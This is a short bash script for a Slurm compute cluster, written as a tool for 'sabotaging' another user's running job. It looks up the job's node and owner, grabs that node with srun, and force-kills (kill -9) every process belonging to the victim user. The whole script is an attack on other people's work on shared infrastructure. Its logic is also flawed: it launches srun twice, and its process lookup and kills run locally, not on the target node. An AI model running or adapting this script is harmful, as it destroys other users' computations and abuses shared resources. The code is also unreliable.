#!/bin/bash

if [ -z "$1" ]
  then
    echo "Usage: $0 <job_id> <account>"
    exit 1
fi

JOBID=$1
NODEID=$(squeue -j $JOBID -o "%N" -h)
USERID=$(squeue -j $JOBID -o "%u" -h)
echo "Sabotaging job $JOBID from $USERID on node $NODEID..."

srun_command="srun --nodelist=$NODEID --nodes=1 --time=0:05:00 --account=$2 --pty bash"
$srun_command &
srun_pid=$!

# Wait for the srun command to start
while true; do
    $srun_command &
    srun_pid=$!

    # Check if the srun command is running
    if ps -p $srun_pid > /dev/null; then
        # The srun command is running
        echo "The srun command is running with PID $srun_pid"

        pids=$(pgrep -u $USERID)
        for pid in $pids; do
          echo "Killing $pid"
          if [ $pid -ne $$ ]; then
            kill -9 $pid
            echo "Killed $pid"
          fi
        done
        break
    else
        # The srun command is not running yet
        echo "Waiting for the srun command to start..."
        sleep 1
    fi
done